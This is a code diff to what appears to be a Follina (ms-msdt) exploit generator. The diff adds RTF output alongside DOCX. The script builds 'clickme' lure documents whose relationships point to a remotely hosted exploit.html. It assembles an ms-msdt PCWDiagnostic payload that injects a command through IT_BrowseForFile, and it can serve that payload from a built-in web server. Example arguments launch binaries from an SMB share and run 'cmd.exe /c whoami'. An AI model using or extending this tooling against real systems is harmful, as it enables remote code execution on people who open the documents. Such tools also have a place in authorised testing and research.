@@ -13,12 +13,47 @@ def zipdir(path, ziph):
     for root, dirs, files in os.walk(path):
         for file in files:
             os.utime(os.path.join(root, file), (1653895859, 1653895859))
-            ziph.write(os.path.join(root, file), 
+            ziph.write(os.path.join(root, file),
                        os.path.relpath(
-                            os.path.join(root, file), 
+                            os.path.join(root, file),
                             path
                        ))
 
+
+def generate_docx(payload_url):
+    const_docx_name = "clickme.docx"
+
+    with open("src/document.xml.rels.tpl", "r") as f:
+        tmp = f.read()
+
+    payload_rels = tmp.format(payload_url = payload_url)
+
+    if not os.path.exists("src/docx/word/_rels"):
+        os.makedirs("src/docx/word/_rels")
+
+    with open("src/docx/word/_rels/document.xml.rels", "w") as f:
+        f.write(payload_rels)
+
+    with zipfile.ZipFile(const_docx_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
+        zipdir("src/docx", zipf)
+
+    print(f"Generated '{const_docx_name}' in current directory")
+
+    
+def generate_rtf(payload_url):
+    const_rtf_name = "clickme.rtf"
+
+    with open("src/rtf/clickme.rtf.tpl", "r") as f:
+        tmp = f.read()
+
+    payload_rtf = tmp.replace('{payload_url}', payload_url) # cannot use format due to {} characters in RTF
+
+    with open(const_rtf_name, "w") as f:
+        f.write(payload_rtf)
+
+    print(f"Generated '{const_rtf_name}' in current directory")    
+
+    
 if __name__ == "__main__":
 
     # Parse arguments
@@ -33,17 +68,20 @@ if __name__ == "__main__":
         help='The full path of the binary to run. Can be local or remote from an SMB share')
     command.add_argument('-c', '--command', action='store', dest='command',
         help='The encoded command to execute in "command" mode')
+    optional.add_argument('-t', '--type', action='store', dest='type', choices={"docx", "rtf"}, default="docx",
+        help='The type of payload to use, can be "docx" or "rtf"', required=True)
     optional.add_argument('-u', '--url', action='store', dest='url', default='localhost',
-        help='The hostname or IP address where the generated document should retrieve your payload, defaults to "localhost"')
+        help='The hostname or IP address where the generated document should retrieve your payload, defaults to "localhost". Disables web server if custom URL scheme or path are specified')
     optional.add_argument('-H', '--host', action='store', dest='host', default="0.0.0.0",
         help='The interface for the web server to listen on, defaults to all interfaces (0.0.0.0)')
     optional.add_argument('-P', '--port', action='store', dest='port', default=80, type=int,
         help='The port to run the HTTP server on, defaults to 80')
     args = parser.parse_args()
 
+    payload_url = f"http://{args.url}:{args.port}/exploit.html"
+    
     if args.mode == "binary" and args.binary is None:
         raise SystemExit("Binary mode requires a binary to be specified, e.g. -b '\\\\localhost\\c$\\Windows\\System32\\calc.exe'")
-
 
     if args.mode == "command" and args.command is None:
         raise SystemExit("Command mode requires a command to be specified, e.g. -c 'c:\\windows\\system32\\cmd.exe /c whoami > c:\\users\\public\\pwned.txt'")
@@ -57,11 +95,7 @@ if __name__ == "__main__":
             path = args.url.split("/")[1]
         except IndexError:  # no path detected in URL
             path = None
-        if url.scheme == "http" or url.scheme == "https":  # if protocol is specified, use user input as-is
-            payload_url = f"{args.url}"
-            enable_webserver = False
-            print("Custom URL detected, webserver will be disabled")
-        elif path is not None:  # path detected in user input
+        if url.scheme == "http" or url.scheme == "https" or path is not None:  # if protocol or path is specified, use user input as-is
             payload_url = f"{args.url}"
             enable_webserver = False
             print("Custom URL detected, webserver will be disabled")
@@ -79,22 +113,11 @@ if __name__ == "__main__":
         payload = fr'"ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$({binary_path})/.exe\""'
 
     # Prepare the doc file
-    with open("src/document.xml.rels.tpl", "r") as f:
-        tmp = f.read()
+    if args.type == "docx":
+        generate_docx(payload_url)
 
-    payload_rels = tmp.format(payload_url = payload_url)
-
-    if not os.path.exists("src/clickme/word/_rels"):
-        os.makedirs("src/clickme/word/_rels")
-
-    with open("src/clickme/word/_rels/document.xml.rels", "w") as f:
-        f.write(payload_rels)
-
-    with zipfile.ZipFile('clickme.docx', 'w', zipfile.ZIP_DEFLATED) as zipf:
-        zipdir('src/clickme/', zipf)
-
-    print("Generated 'clickme.docx' in current directory")
-
+    if args.type == "rtf":
+        generate_rtf(payload_url)
 
     # Prepare the HTML payload
     if not os.path.exists("www"):
@@ -109,7 +132,6 @@ if __name__ == "__main__":
         f.write(payload_html)
 
     print("Generated 'exploit.html' in 'www' directory")
-
 
     # Host the payload
     if enable_webserver is True:
